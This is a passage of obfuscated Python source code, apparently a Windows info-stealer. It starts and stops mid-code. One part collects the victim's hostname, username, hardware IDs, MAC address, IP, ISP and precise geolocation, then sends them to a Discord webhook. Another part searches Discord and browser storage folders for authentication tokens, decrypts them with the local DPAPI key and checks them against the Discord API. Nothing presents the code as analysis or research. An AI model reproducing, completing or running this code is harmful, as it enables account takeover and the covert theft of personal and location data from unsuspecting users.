    try: ROCUSLJIDPLODHOMMNDBDIAEOSKOZYPLPUPOLURYYMGXNDVMRESBKAABMTQLRXTFWLIDKQVVVVO = psutil.cpu_count(logical=False)
    except: ROCUSLJIDPLODHOMMNDBDIAEOSKOZYPLPUPOLURYYMGXNDVMRESBKAABMTQLRXTFWLIDKQVVVVO = "None"

    try: LWWVDIOPFKCYTHDAQZUYLCMGSFBAAVVHCZWQLUYNDIMBXRRXIQYDBMK = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: LWWVDIOPFKCYTHDAQZUYLCMGSFBAAVVHCZWQLUYNDIMBXRRXIQYDBMK = "None"

    try:
        GYKPMVMCQGEHGNWOADORBNFWRBYHBXYVBCXJXREBUXQQBMJZKTVFYDNKFCUKNJBLDFMWIKORVNUOIBLIWVRHWR = []
        BODFAOBPCMCRRCZLINEIIDKYALHSVREUXSDLIDBNPMPTXAPTWRIGVQGFDWUOT = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if BODFAOBPCMCRRCZLINEIIDKYALHSVREUXSDLIDBNPMPTXAPTWRIGVQGFDWUOT & 1:
                FHPMMIVOAWGQCGJTWAQKKJYBARRSAPLZFZAQKGFELSOATWTHXHAQVCWBRFARVYSVZGDMUFOQUGLTMEJRNLBVNIUVMZBD = v4r_letter + ":\\"
                try:
                    CAOCPLIEZDNUDNSGEIWVUWPPBTPLPRXVVKMDJMVTYVZWAODTVFYFNZNROOFRKJKWRY = ctypes.c_ulonglong(0)
                    WSZAVWPTBNKSPQWTLOBYSZDOWMMPRRJMOEZIVRBATZKKEJTBTFTWTQTZPIXJYMKSVHVNDLYYMLNVPRMWCDOHQRTBZIKRLEJHC = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(FHPMMIVOAWGQCGJTWAQKKJYBARRSAPLZFZAQKGFELSOATWTHXHAQVCWBRFARVYSVZGDMUFOQUGLTMEJRNLBVNIUVMZBD), None, ctypes.pointer(WSZAVWPTBNKSPQWTLOBYSZDOWMMPRRJMOEZIVRBATZKKEJTBTFTWTQTZPIXJYMKSVHVNDLYYMLNVPRMWCDOHQRTBZIKRLEJHC), ctypes.pointer(CAOCPLIEZDNUDNSGEIWVUWPPBTPLPRXVVKMDJMVTYVZWAODTVFYFNZNROOFRKJKWRY))
                    HNCVYXVJPVNFFUAYFHAYENHFKSPIBWZABMYIRGFZPUFNHYXZZDZSWQNQIBWJQIOSRFWUEQIKHKFIMSNSZXFVL = WSZAVWPTBNKSPQWTLOBYSZDOWMMPRRJMOEZIVRBATZKKEJTBTFTWTQTZPIXJYMKSVHVNDLYYMLNVPRMWCDOHQRTBZIKRLEJHC.value
                    PHCDPYFAXNRFXTDTFSNAVZOSUTYSMDJNTVINKXGSIBFVUVMJKLYDCAIWMSKPHMXUIVZHTOMAFHQPAEUSRLVVLLSONKDUJFBWCZT = CAOCPLIEZDNUDNSGEIWVUWPPBTPLPRXVVKMDJMVTYVZWAODTVFYFNZNROOFRKJKWRY.value
                    EIMJBZFQNCLCDYDFJMSWXZMTJFZMGONEQDGOSRSKBCUWBYEKNUBKVFFOQTLUYXGGCXVJVMGPRJQJUVOXNCBVLNW = HNCVYXVJPVNFFUAYFHAYENHFKSPIBWZABMYIRGFZPUFNHYXZZDZSWQNQIBWJQIOSRFWUEQIKHKFIMSNSZXFVL - PHCDPYFAXNRFXTDTFSNAVZOSUTYSMDJNTVINKXGSIBFVUVMJKLYDCAIWMSKPHMXUIVZHTOMAFHQPAEUSRLVVLLSONKDUJFBWCZT
                    XFPTKNFINZGGWFNGDCKNPFWKPROVZMWZIYTAINLSKZYZHLWIEQSKKVRLWTJESIVBSZRVESPVSSRSFIKRUAQDQGHODWJXFTXZHWO = win32api.GetVolumeInformation(FHPMMIVOAWGQCGJTWAQKKJYBARRSAPLZFZAQKGFELSOATWTHXHAQVCWBRFARVYSVZGDMUFOQUGLTMEJRNLBVNIUVMZBD)[0]
                    drive = {
                        'drive': FHPMMIVOAWGQCGJTWAQKKJYBARRSAPLZFZAQKGFELSOATWTHXHAQVCWBRFARVYSVZGDMUFOQUGLTMEJRNLBVNIUVMZBD,
                        'total': HNCVYXVJPVNFFUAYFHAYENHFKSPIBWZABMYIRGFZPUFNHYXZZDZSWQNQIBWJQIOSRFWUEQIKHKFIMSNSZXFVL,
                        'free': PHCDPYFAXNRFXTDTFSNAVZOSUTYSMDJNTVINKXGSIBFVUVMJKLYDCAIWMSKPHMXUIVZHTOMAFHQPAEUSRLVVLLSONKDUJFBWCZT,
                        'used': EIMJBZFQNCLCDYDFJMSWXZMTJFZMGONEQDGOSRSKBCUWBYEKNUBKVFFOQTLUYXGGCXVJVMGPRJQJUVOXNCBVLNW,
                        'name': XFPTKNFINZGGWFNGDCKNPFWKPROVZMWZIYTAINLSKZYZHLWIEQSKKVRLWTJESIVBSZRVESPVSSRSFIKRUAQDQGHODWJXFTXZHWO,
                    }
                    GYKPMVMCQGEHGNWOADORBNFWRBYHBXYVBCXJXREBUXQQBMJZKTVFYDNKFCUKNJBLDFMWIKORVNUOIBLIWVRHWR.append(drive)
                except:
                    ()
            BODFAOBPCMCRRCZLINEIIDKYALHSVREUXSDLIDBNPMPTXAPTWRIGVQGFDWUOT >>= 1

        YEMYXEWGIWTLCXLMZWLUTTZAXLAHHTGLXPZXGOONCLQOLXVQQIMRQNHGBBHKZTGDT = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in GYKPMVMCQGEHGNWOADORBNFWRBYHBXYVBCXJXREBUXQQBMJZKTVFYDNKFCUKNJBLDFMWIKORVNUOIBLIWVRHWR:
            SUTDAWNYCPVKDGXWRPDWECSGBQOAOMIBYJTTJUHNVWLKAXUFZHCOWPJFQEJYWVJEYXMKGJM = (v4r_drive['used'] / v4r_drive['total']) * 100
            PHCDPYFAXNRFXTDTFSNAVZOSUTYSMDJNTVINKXGSIBFVUVMJKLYDCAIWMSKPHMXUIVZHTOMAFHQPAEUSRLVVLLSONKDUJFBWCZT_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            HNCVYXVJPVNFFUAYFHAYENHFKSPIBWZABMYIRGFZPUFNHYXZZDZSWQNQIBWJQIOSRFWUEQIKHKFIMSNSZXFVL_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            SUTDAWNYCPVKDGXWRPDWECSGBQOAOMIBYJTTJUHNVWLKAXUFZHCOWPJFQEJYWVJEYXMKGJM_str = "{:.2f}%".format(SUTDAWNYCPVKDGXWRPDWECSGBQOAOMIBYJTTJUHNVWLKAXUFZHCOWPJFQEJYWVJEYXMKGJM)
            YEMYXEWGIWTLCXLMZWLUTTZAXLAHHTGLXPZXGOONCLQOLXVQQIMRQNHGBBHKZTGDT += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   PHCDPYFAXNRFXTDTFSNAVZOSUTYSMDJNTVINKXGSIBFVUVMJKLYDCAIWMSKPHMXUIVZHTOMAFHQPAEUSRLVVLLSONKDUJFBWCZT_gb,
                                                                   HNCVYXVJPVNFFUAYFHAYENHFKSPIBWZABMYIRGFZPUFNHYXZZDZSWQNQIBWJQIOSRFWUEQIKHKFIMSNSZXFVL_gb,
                                                                   SUTDAWNYCPVKDGXWRPDWECSGBQOAOMIBYJTTJUHNVWLKAXUFZHCOWPJFQEJYWVJEYXMKGJM_str,
                                                                   v4r_drive['name'])
    except:
        YEMYXEWGIWTLCXLMZWLUTTZAXLAHHTGLXPZXGOONCLQOLXVQQIMRQNHGBBHKZTGDT = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            JZUQNUFILEFULEPGAWACAUUNSMXNNPMXEDZCWAOLVHCZYHZFPT = 'Pc Portable'
        else:
            JZUQNUFILEFULEPGAWACAUUNSMXNNPMXEDZCWAOLVHCZYHZFPT = 'Pc Fixed'
    except:
        JZUQNUFILEFULEPGAWACAUUNSMXNNPMXEDZCWAOLVHCZYHZFPT = "None"

    try: QLENGLWSFMGQSBUZOLVWSZLVKRVXSHTGWXPBNXMPNPQNTYZUQZQMBOEJJUCYIUTTUMKLRDLQDMDPTCOKKZRWJKEPHMBNWJGNSFPK = len(screeninfo.get_monitors())
    except: QLENGLWSFMGQSBUZOLVWSZLVKRVXSHTGWXPBNXMPNPQNTYZUQZQMBOEJJUCYIUTTUMKLRDLQDMDPTCOKKZRWJKEPHMBNWJGNSFPK = "None"

    embed = Embed(title=f'System Info {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:', color=DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {PXKDJVIGTTFJBTZVHSWUUYITWHWUSFFLBFCJRBRBWWSYYAHAFYXSJRDEJWO}
Username    : {HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}
DisplayName : {DLWMHZAGBZSXRVXEAEMZVJQMCVXIOEAMGVYUQKCGONSSBIXNMTTPBPWDBSMEWNGTTOVCVU}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {JZUQNUFILEFULEPGAWACAUUNSMXNNPMXEDZCWAOLVHCZYHZFPT}
Exploitation  : {CNXKJBYSSUFBKVEFREMVGZZWGBXPRGDTEJCSXHUDLKOYKPXUNPQOVKOSRFOQDZADRZUNFXICRLUOBXZUISBAHMJSHHNSMOEOBW} {ZQYPAUGFAVJQGCJFEPTEWKJPZUJRGJDMYVPHGHSYTPDFKYHYPTQWCOVZWQQKOUWWWWNGRVOKSKVKZRGCNAVZS}
Screen Number : {QLENGLWSFMGQSBUZOLVWSZLVKRVXSHTGWXPBNXMPNPQNTYZUQZQMBOEJJUCYIUTTUMKLRDLQDMDPTCOKKZRWJKEPHMBNWJGNSFPK}

HWID : {BYTDAHFKTVXLMEIJBUKBWDDFNINYXOGBPZHYVJAMIFSIMNWOUUBMJXYDXKBVCKVIJBOFLWRNQKSRSDLGJIFCQ}
MAC  : {IKVMHOFRMOGVSQFXYLQTGHQFQNKDJOQTSBBIGNPGOTVPSQFPOJRGXMBJYWSGNUOGVLINKY}
CPU  : {QBADXLPMRMBSXNLBGVUXGXIVWSRFHSKTOMZJGYWTPKIDEQBQHHG}, {ROCUSLJIDPLODHOMMNDBDIAEOSKOZYPLPUPOLURYYMGXNDVMRESBKAABMTQLRXTFWLIDKQVVVVO} Core
GPU  : {LWWVDIOPFKCYTHDAQZUYLCMGSFBAAVVHCZWQLUYNDIMBXRRXIQYDBMK}
RAM  : {JRHQIBYPTPOQWZSPZZUTGLPDJLGQJCNSYSOJSZQCIZRHJFDMBTEVOYOFJKKFQLKCAOJDMCPPHPQPRRQNSJHUH}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}
Local  : {MGFYHQGMKUAOUOTSYXJQQPVBTIYEGIKEOQFLASRWHUKRVGBOKQYTEVLSJWPWVSYKH}
Isp    : {FSJNHKJYSVKHVQDEKSUAQQNAHESFRZAAIQMKLFZQXPJTFIYWXONBGP}
Org    : {PAIRCBIBNQFOVIDTRAOQFZFRNNVYFIECIUIEBNZPZKIAAFNUZEWEEUCCIF}
As     : {OIKVUEARRQQPEXGUTESRWTIMUMAVLSPQJSBDGTXUYZBIOLTBYYOIMYGZDXIAAEIGNEGDNAYR}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{YEMYXEWGIWTLCXLMZWLUTTZAXLAHHTGLXPZXGOONCLQOLXVQQIMRQNHGBBHKZTGDT}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK} ({KTDYLIMNIRIRRXCIEKGEYITKCDNQPAQLFLULSABKVJMGKAEYYTWQVZCSJAMJBBJGMNAAHWVWTWIEEWDWGBFWUIJPZK_code})
Region    : {CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB} ({CMDBFNQXZMDGFSHKFTUYJABDFFKGAPKLTYLQNCNWBXLLGKSTATXHYJAUJXB_code})
Zip       : {RTCITEGTNWSVPCRBHGYPMWOUCLKGVJWJZYZYNXGCYZFXPVYRGNEBTCVCOVEAAULZRJAAWUJFUDDJF}
City      : {DHKGZYYOZTQHNDKPCIXPVBRETDZJKQONHXEKKTILJWEQTDFRHFZCUXOIV}
Timezone  : {VMAABVBEGMLOZHIWIFMPMXNEOXVQCGIHASWPQIPLORONPIBUUHGPXLJDCOQEUGDRMCBTMIDITVICNUWXTLLICQELBI}
Latitude  : {ISXLUIHGTUEWERTMOILPOBGLIWBRGTWROKCXPSCKLHMIUYWBESMBJOUISEXFEUPXAUSLYUEQOKZUKVBBZSUKGOVYRRQGZCEVW}
Longitude : {GAQEVKMSMAPZAVVMQTRMGQYBHCHPGFDTNOUHCBPTVOEGEOGZHEJAAEYLCVAJXVXQCHNJXTHVDIIDHJVYMKBDKMDTRUCLEYPTJ}```""", inline=False)


    embed.set_footer(text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)

    WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ = SyncWebhook.from_url(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)
    WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ.send(embed=embed, username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)

def JIXMPPDJEZOZSNFGTQAHQFXHKEOXHFOURXLNBQXZZNAHCAPAMUBFGOBIPYUAEOPKQEPXHXVYWHMCRJUASNSH():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def MWIPFWJGWOUQUSRUKFXTZLRTCGTJPILPNVLZDKOALSHNMOPFISESSVVL():
        THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI = "https://discord.com/api/v9/users/@me"
        HPRVNOAUDAOEUCQZTOZFUUICILYMGEXKCJOHRKTGMDEEQAYSIEBEFPJHJNJ = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        HPRVNOAUDAOEUCQZTOZFUUICILYMGEXKCJOHRKTGMDEEQAYSIEBEFPJHJNJ_enc = r"dQw4w9WgXcQ:[^\"]*"
        HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT = []
        LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA = []
        XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI = {}

        PTIZGXZRWNEJNMSWMUDDDESHJAUMAYNQBKMZNSYYPAGZFPAYRQPVBXFNMDNLSZUQYWNAAISVRAL = {
            'Discord': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ, QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG in PTIZGXZRWNEJNMSWMUDDDESHJAUMAYNQBKMZNSYYPAGZFPAYRQPVBXFNMDNLSZUQYWNAAISVRAL.items():
            if not os.path.exists(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
                continue
            NODFFPRNRTBPVSZAZPLHSUNMSBJEACJFAIQFIVHGISTMGPLZESCXMHYCFSDU = XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ.replace(" ", "").lower()
            if "cord" in QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG:
                if not os.path.exists(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + f'\\{NODFFPRNRTBPVSZAZPLHSUNMSBJEACJFAIQFIVHGISTMGPLZESCXMHYCFSDU}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(HPRVNOAUDAOEUCQZTOZFUUICILYMGEXKCJOHRKTGMDEEQAYSIEBEFPJHJNJ_enc, v4r_line.strip()):
                                BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG = UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), WUQSGLSEJEDQENBHHOBLAIETSREYKLDAKZDSUFAPPBVMGANDXASOGDHSCKZQCPPTRNHLKZRYVDOLQVNYBVSFTEHYKBA(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE + f'\\{NODFFPRNRTBPVSZAZPLHSUNMSBJEACJFAIQFIVHGISTMGPLZESCXMHYCFSDU}\\Local State'))
                                if TQUSXERQNSYGUPJLCMITQYLTYEKIZAHKPQXKEWPGVFJZCPHYNTSVADINY(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG, THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI):
                                    VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA = requests.get(THVZQVZJDDPYAHLBXIISSHIRHVJHUAFVXJVYNWIIOURDMKZHTEBDYEWLHOSI, headers={'Authorization': BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG}).json()['id']
                                    if VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA not in LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA:
                                        HQHKWWOCXLEKRAYGBEODVCRPRICKKTUQZGVVQYRVKXKRJABJGGTQAZXYLVCLWHORFNTXELUKMTLQZZNHERJNKPZONUPTZGMSILVT.append(BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG)
                                        LBUDGZOTXKMHIBSGUTGTXPLPEKVAZEFTVCBXXPILCVBGMRJNNXLHZVCTROPGGA.append(VJOGEKAFILMHLCPAYETLPSYNBDXNGKXJVQFATWQMUFXRZILQRRKCFEFALEKDLXAA)
                                        XLWEWVOUNJXCLEPZMMZDKNKOKRJLUCISECMCADRTNMQYUJAGBFKVUGHVI[BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG] = (XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ, f"{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for BWOSAKZQFNFKGXMPKRQKYZRPETIQQSZQYIPWVBOHXRYWBFVBCOKHQPDWOLDUFCEGGXVUWCTNPYLUQVAFOSCYZXLFOFGYBG in re.findall(HPRVNOAUDAOEUCQZTOZFUUICILYMGEXKCJOHRKTGMDEEQAYSIEBEFPJHJNJ, v4r_line.strip()):
